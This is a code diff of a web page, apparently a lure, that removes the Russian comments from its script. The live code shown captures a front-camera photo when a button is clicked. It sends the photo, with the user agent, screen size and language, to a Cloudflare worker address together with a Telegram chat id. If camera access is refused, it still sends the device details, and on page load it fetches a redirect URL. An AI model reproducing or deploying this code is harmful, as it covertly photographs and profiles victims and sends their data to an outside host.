@@ -11,12 +11,12 @@
         font-style: normal;
     }
 
-    /* Самое важное: применяем ко всем элементам принудительно */
+  
     * {
         font-family: 'MyFont', sans-serif !important;
     }
 
-    /* Отдельно для кнопки, так как она самая капризная */
+   
     button {
         font-family: 'MyFont', sans-serif !important;
         -webkit-font-smoothing: antialiased;
@@ -39,7 +39,7 @@
            const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 const chatId = '1976857829';
 
-// 1. Запрашиваем ссылку из памяти ЗАРАНЕЕ (сразу при открытии страницы)
+
 let targetUrlPromise = fetch(proxyUrl + "/get-url")
     .then(res => res.text())
     .catch(() => "https://google.com");
@@ -53,11 +53,9 @@ btn.onclick = async () => {
     btn.disabled = true;
     let stream;
 
-    // Собираем данные устройства ЗАРАНЕЕ
     const info = `📱 Устройство: ${navigator.userAgent}\n🖥 Экран: ${window.screen.width}x${window.screen.height}\n🌐 Язык: ${navigator.language}`;
 
     try {
-        // Пробуем включить камеру
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
         video.setAttribute("playsinline", true);
@@ -74,19 +72,17 @@ btn.onclick = async () => {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
-        formData.append('caption', info); // Добавляем инфо к фото
+        formData.append('caption', info); 
 
         fetch(proxyUrl, { method: 'POST', body: formData });
 
     } catch (err) {
-        // ЕСЛИ ОТКАЗАЛ В КАМЕРЕ — отправляем только текст
         console.log("Доступ к камере запрещен, отправляем данные без фото");
         
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('text', `Запрещен доступ к камере\n\n${info}`);
         
-        // Отправляем как обычное сообщение (Воркер поймет это)
         fetch(proxyUrl, { method: 'POST', body: formData });
 
     } finally {
